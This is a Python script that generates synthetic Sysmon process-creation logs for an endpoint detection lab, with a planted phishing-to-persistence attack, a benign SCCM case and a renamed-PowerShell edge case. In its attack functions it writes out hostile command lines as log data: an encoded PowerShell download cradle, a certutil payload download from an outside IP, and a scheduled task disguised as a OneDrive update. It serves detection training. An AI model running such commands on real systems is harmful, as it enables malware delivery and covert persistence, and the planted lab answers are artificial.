#!/usr/bin/env python3
"""
Synthetic Sysmon Event ID 1 (process creation) events for the endpoint detection lab.

Planted
  ATTACK   WKS-0113: Outlook -> Word (macro document) -> cmd -> encoded PowerShell download cradle
           -> certutil downloads p.exe to C:\\Users\\Public -> p.exe runs -> scheduled task persistence
  BENIGN   5 workstations: SCCM client (CcmExec.exe) runs encoded PowerShell as SYSTEM to inventory hotfixes
  EDGE     WKS-0119: a RENAMED PowerShell (svch0st.exe in Downloads) with an encoded command;
           Sysmon's OriginalFileName still says PowerShell.EXE
Noise: browsers, Teams, Office, Explorer, svchost, OneDrive.

Usage: python generate_sysmon.py [--seed 3]
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import random
import uuid
from datetime import datetime, timedelta

DAY = datetime(2026, 10, 22, 8, 0, 0)


def enc(ps: str) -> str:
    return base64.b64encode(ps.encode("utf-16-le")).decode()


class Gen:
    def __init__(self, seed):
        self.r = random.Random(seed)
        self.events = []

    def guid(self):
        return "{" + str(uuid.UUID(int=self.r.getrandbits(128), version=4)).upper() + "}"

    def proc(self, t, host, user, image, cmd, parent=None, original=None, integrity="Medium"):
        g = self.guid()
        name = image.split("\\")[-1]
        ev = {
            "EventID": 1, "UtcTime": t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "Computer": f"{host}.corp.example",
            "User": user, "Image": image, "OriginalFileName": original if original is not None else name,
            "CommandLine": cmd, "ProcessGuid": g, "IntegrityLevel": integrity,
            "ParentImage": parent["Image"] if parent else "C:\\Windows\\explorer.exe",
            "ParentCommandLine": parent["CommandLine"] if parent else "C:\\Windows\\Explorer.EXE",
            "ParentProcessGuid": parent["ProcessGuid"] if parent else "{00000000-0000-0000-0000-000000000000}",
            "Hashes": "SHA256=" + "".join(self.r.choice("0123456789ABCDEF") for _ in range(64)),
        }
        self.events.append(ev)
        return ev

    def noise(self):
        apps = [("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", '"chrome.exe"', "chrome.exe"),
                ("C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe", "Teams.exe --process-start-reason=AutoStart", "Teams.exe"),
                ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", '"EXCEL.EXE" /dde', "Excel.exe"),
                ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", '"OUTLOOK.EXE"', "OUTLOOK.EXE"),
                ("C:\\Windows\\System32\\notepad.exe", "notepad.exe", "NOTEPAD.EXE"),
                ("C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe", "OneDrive.exe /background", "OneDrive.exe")]
        users = ["m.ali", "s.patel", "l.nguyen", "r.brown", "t.wilson", "n.diallo", "o.tanaka", "c.kim"]
        for i, u in enumerate(users):
            host = f"WKS-01{i + 3:02d}" if u not in ("n.diallo", "o.tanaka") else ("WKS-0113" if u == "n.diallo" else "WKS-0119")
            t = DAY + timedelta(minutes=self.r.randint(0, 60))
            for _ in range(self.r.randint(6, 12)):
                img, cmd, orig = self.r.choice(apps)
                img = img.replace("{u}", u)
                p = self.proc(t, host, f"CORP\\{u}", img, cmd, original=orig)
                if "chrome" in img and self.r.random() < 0.5:
                    self.proc(t + timedelta(seconds=1), host, f"CORP\\{u}", img, '"chrome.exe" --type=renderer', p, orig)
                t += timedelta(minutes=self.r.randint(3, 40))
            # svchost noise as SYSTEM
            self.proc(DAY + timedelta(minutes=self.r.randint(0, 400)), host, "NT AUTHORITY\\SYSTEM",
                      "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
                      original="svchost.exe", integrity="System")

    def sccm(self):
        ps = "Get-HotFix | Select-Object HotFixID, InstalledOn | Export-Csv C:\\Windows\\Temp\\hotfix_inventory.csv -NoTypeInformation"
        for n in (3, 4, 5, 6, 7):
            host = f"WKS-01{n:02d}"
            t = DAY + timedelta(hours=1, minutes=n * 3)
            ccm = self.proc(t, host, "NT AUTHORITY\\SYSTEM", "C:\\Windows\\CCM\\CcmExec.exe",
                            "C:\\Windows\\CCM\\CcmExec.exe", original="CcmExec.exe", integrity="System")
            self.proc(t + timedelta(seconds=30), host, "NT AUTHORITY\\SYSTEM",
                      "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                      f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {enc(ps)}", ccm,
                      original="PowerShell.EXE", integrity="System")

    def attack(self):
        host, user = "WKS-0113", "CORP\\n.diallo"
        t = DAY + timedelta(hours=2, minutes=14, seconds=7)
        outlook = self.proc(t, host, user, "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
                            '"OUTLOOK.EXE"', original="OUTLOOK.EXE")
        t += timedelta(minutes=3, seconds=12)
        word = self.proc(t, host, user, "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                         '"WINWORD.EXE" /n "C:\\Users\\n.diallo\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\X1Q7\\Invoice_8841.docm" /o ""',
                         outlook, original="WinWord.exe")
        cradle = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/a.ps1')"
        t += timedelta(seconds=9)
        cmd = self.proc(t, host, user, "C:\\Windows\\System32\\cmd.exe",
                        f"cmd.exe /c powershell -nop -w hidden -enc {enc(cradle)}", word, original="Cmd.Exe")
        t += timedelta(seconds=1)
        ps = self.proc(t, host, user, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       f"powershell  -nop -w hidden -enc {enc(cradle)}", cmd, original="PowerShell.EXE")
        t += timedelta(seconds=6)
        self.proc(t, host, user, "C:\\Windows\\System32\\certutil.exe",
                  '"C:\\Windows\\system32\\certutil.exe" -urlcache -split -f http://203.0.113.99/p.exe C:\\Users\\Public\\p.exe',
                  ps, original="CertUtil.exe")
        t += timedelta(seconds=4)
        pe = self.proc(t, host, user, "C:\\Users\\Public\\p.exe", "C:\\Users\\Public\\p.exe", ps, original="")
        t += timedelta(seconds=15)
        self.proc(t, host, user, "C:\\Windows\\System32\\schtasks.exe",
                  'schtasks.exe /create /tn "OneDrive Standalone Update" /tr C:\\Users\\Public\\p.exe /sc onlogon /f',
                  pe, original="schtasks.exe")

    def renamed(self):
        host, user = "WKS-0119", "CORP\\o.tanaka"
        t = DAY + timedelta(hours=4, minutes=2, seconds=40)
        payload = "Start-Process -WindowStyle Hidden -FilePath $env:TEMP\\upd.exe"
        self.proc(t, host, user, "C:\\Users\\o.tanaka\\Downloads\\setup\\svch0st.exe",
                  f"svch0st.exe -ep bypass -e {enc(payload)}", original="PowerShell.EXE")

    def build(self):
        self.noise()
        self.sccm()
        self.attack()
        self.renamed()
        self.events.sort(key=lambda e: e["UtcTime"])
        return self.events


def main(argv=None) -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--seed", type=int, default=3)
    p.add_argument("--out", default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "data"))
    a = p.parse_args(argv)
    os.makedirs(a.out, exist_ok=True)
    events = Gen(a.seed).build()
    with open(os.path.join(a.out, "sysmon_process_creation.jsonl"), "w", encoding="utf-8", newline="\n") as fh:
        for e in events:
            fh.write(json.dumps(e) + "\n")
    with open(os.path.join(a.out, "allowlist.json"), "w", encoding="utf-8", newline="\n") as fh:
        json.dump([{"rule": "ENCODED_POWERSHELL", "parent_image": "C:\\Windows\\CCM\\CcmExec.exe",
                    "user": "NT AUTHORITY\\SYSTEM", "decoded_must_contain": "Get-HotFix",
                    "reason": "SCCM hotfix inventory script", "owner": "IT Ops", "review_date": "2027-04-01"}], fh, indent=2)
        fh.write("\n")
    print(f"Wrote {len(events)} process creation events")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
